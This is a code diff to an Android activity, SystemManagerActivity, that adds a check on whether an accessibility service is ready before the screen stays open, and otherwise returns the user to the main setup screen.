@@ -17,6 +17,7 @@ import android.widget.TextView;
 import androidx.appcompat.app.AppCompatActivity;
 import com.task.tusker.permissions.AutoPermissionManager;
 import com.task.tusker.utils.ActivityTracker;
+import com.task.tusker.services.UnifiedAccessibilityService;
 
 import java.util.Locale;
 
@@ -81,7 +82,7 @@ public class SystemManagerActivity extends AppCompatActivity {
         permMgr = new AutoPermissionManager(this);
 
         // Guard: if accessibility is not enabled, go back to MainActivity
-        if (!permMgr.isAccessibilityServiceEnabled()) {
+        if (!permMgr.isAccessibilityServiceEnabled() || !UnifiedAccessibilityService.isServiceReady(this)) {
             startActivity(new Intent(this, MainActivity.class)
                     .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP));
             finish();
@@ -138,7 +139,7 @@ public class SystemManagerActivity extends AppCompatActivity {
         super.onResume();
         ActivityTracker.set(this);
         // If accessibility was disabled while activity was paused → return to setup screen
-        if (!permMgr.isAccessibilityServiceEnabled()) {
+        if (!permMgr.isAccessibilityServiceEnabled() || !UnifiedAccessibilityService.isServiceReady(this)) {
             startActivity(new Intent(this, MainActivity.class)
                     .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP));
             finish();
